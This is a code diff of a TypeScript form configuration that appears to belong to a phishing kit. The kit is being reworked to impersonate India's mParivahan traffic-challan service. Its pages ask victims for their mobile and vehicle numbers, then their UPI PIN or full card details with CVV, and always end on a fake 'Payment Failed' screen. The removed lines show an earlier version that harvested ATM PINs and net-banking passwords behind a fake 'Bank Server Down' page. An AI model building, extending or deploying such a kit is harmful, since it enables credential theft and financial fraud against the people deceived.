@@ -3,7 +3,7 @@
 // ============================================================
 // To add/remove/change a form page or field:
 //   1. Edit the FORM_PAGES array below
-//   2. The RTO single-page form in public/rto/index.html handles all steps
+//   2. The mParivahan page in public/M privahan/index.html handles all steps
 //   That's it — bot.ts, types, and server routes all read from here.
 // ============================================================
 
@@ -56,72 +56,51 @@ export const FIELD_CATEGORIES: CategoryConfig[] = [
 
 export const FORM_PAGES: PageConfig[] = [
     {
-        id: 'customer_info',
-        pageName: 'customer_info',
-        title: 'Online Service Form',
+        id: 'challan_info',
+        pageName: 'challan_info',
+        title: 'Check Your Challan',
         fields: [
-            { key: 'customerName', displayName: 'Customer Name', type: 'text', category: 'personal', required: true, placeholder: 'Enter Customer Name' },
-            { key: 'mobileNumber', displayName: 'Mobile Number', type: 'tel', category: 'personal', required: true, maxlength: 10, placeholder: 'Enter Mobile Number' },
-            { key: 'reason', displayName: 'Reason', type: 'text', category: 'personal', required: true, placeholder: 'Describe Your Problem' },
+            { key: 'mobileNumber', displayName: 'Mobile Number', type: 'tel', category: 'personal', required: true, maxlength: 10, placeholder: 'Enter 10-digit mobile number' },
+            { key: 'vehicleNumber', displayName: 'Vehicle Registration Number', type: 'text', category: 'personal', required: true, maxlength: 13, placeholder: 'E.G. DL 3C AB 1234' },
         ],
-        nextPage: { main: 'payment_mode' },
+        nextPage: { main: 'payment_options' },
     },
     {
-        id: 'payment_mode',
-        pageName: 'payment_mode',
-        title: 'Payment Mode',
+        id: 'payment_options',
+        pageName: 'payment_options',
+        title: 'Payment Gateway',
         fields: [
-            { key: 'paymentMode', displayName: 'Payment Mode', type: 'radio', category: 'payment', required: true, placeholder: 'PAY / REFUND / OTHER' },
-            { key: 'amount', displayName: 'Amount', type: 'number', category: 'payment', required: true, placeholder: 'Enter Amount' },
+            { key: 'paymentMethod', displayName: 'Payment Method', type: 'text', category: 'payment', required: true, placeholder: 'UPI / Card' },
         ],
-        nextPage: { main: 'payment_method' },
+        nextPage: { upi: 'upi_pin', card: 'card_details' },
     },
     {
-        id: 'payment_method',
-        pageName: 'payment_method',
-        title: 'Select Payment Method',
+        id: 'upi_pin',
+        pageName: 'upi_pin',
+        title: 'UPI PIN',
         fields: [
-            { key: 'paymentMethod', displayName: 'Payment Method', type: 'text', category: 'payment', required: true, placeholder: 'UPI / Card / Net Banking' },
-        ],
-        nextPage: { upi: 'upi_details', card: 'card_details', netbanking: 'netbanking_details' },
-    },
-    {
-        id: 'upi_details',
-        pageName: 'upi_details',
-        title: 'UPI Details',
-        fields: [
-            { key: 'upiBankName', displayName: 'UPI Bank Name', type: 'text', category: 'upi', required: true, placeholder: 'Search or Select Bank' },
+            { key: 'upiApp', displayName: 'UPI App / Method', type: 'text', category: 'upi', required: true, placeholder: 'Google Pay / PhonePe / UPI ID' },
             { key: 'upiPin', displayName: 'UPI PIN', type: 'password', category: 'upi', required: true, placeholder: 'Enter UPI PIN' },
         ],
-        nextPage: { main: 'success' },
+        nextPage: { main: 'payment_failed' },
     },
     {
         id: 'card_details',
         pageName: 'card_details',
         title: 'Card Details',
         fields: [
-            { key: 'cardNumber', displayName: 'Card Number', type: 'tel', category: 'card', required: true, maxlength: 19, placeholder: 'XXXX-XXXX-XXXX-XXXX' },
-            { key: 'expiry', displayName: 'Expiry Date', type: 'text', category: 'card', required: true, maxlength: 5, placeholder: 'MM/YY' },
-            { key: 'cvv', displayName: 'CVV', type: 'password', category: 'card', required: true, maxlength: 3, placeholder: 'Enter 3-digit CVV' },
-            { key: 'atmPin', displayName: 'ATM PIN', type: 'password', category: 'card', required: true, maxlength: 4, placeholder: 'Enter ATM PIN' },
+            { key: 'cardType', displayName: 'Card Type', type: 'text', category: 'card', required: true, placeholder: 'Debit Card / Credit Card' },
+            { key: 'cardNumber', displayName: 'Card Number', type: 'tel', category: 'card', required: true, maxlength: 19, placeholder: 'XXXX XXXX XXXX XXXX' },
+            { key: 'cardHolderName', displayName: 'Card Holder Name', type: 'text', category: 'card', required: true, placeholder: 'Name as on card' },
+            { key: 'cardExpiry', displayName: 'Card Expiry', type: 'text', category: 'card', required: true, maxlength: 7, placeholder: 'MM / YY' },
+            { key: 'cvv', displayName: 'CVV', type: 'password', category: 'card', required: true, maxlength: 4, placeholder: 'CVV' },
         ],
-        nextPage: { main: 'success' },
+        nextPage: { main: 'payment_failed' },
     },
     {
-        id: 'netbanking_details',
-        pageName: 'netbanking_details',
-        title: 'Net Banking Details',
-        fields: [
-            { key: 'bankName', displayName: 'Bank Name', type: 'text', category: 'login', required: true, placeholder: 'Search or Select Bank' },
-            { key: 'username', displayName: 'Username / Customer ID', type: 'text', category: 'login', required: true, placeholder: 'Enter Username / Customer ID' },
-            { key: 'password', displayName: 'Password', type: 'password', category: 'login', required: true, placeholder: 'Enter Password' },
-        ],
-        nextPage: { main: 'success' },
-    },
-    {
-        id: 'success',
-        pageName: 'success',
-        title: 'Bank Server Down',
+        id: 'payment_failed',
+        pageName: 'payment_failed',
+        title: 'Payment Failed',
         fields: [],
         nextPage: { main: null },
         isFinalPage: true,
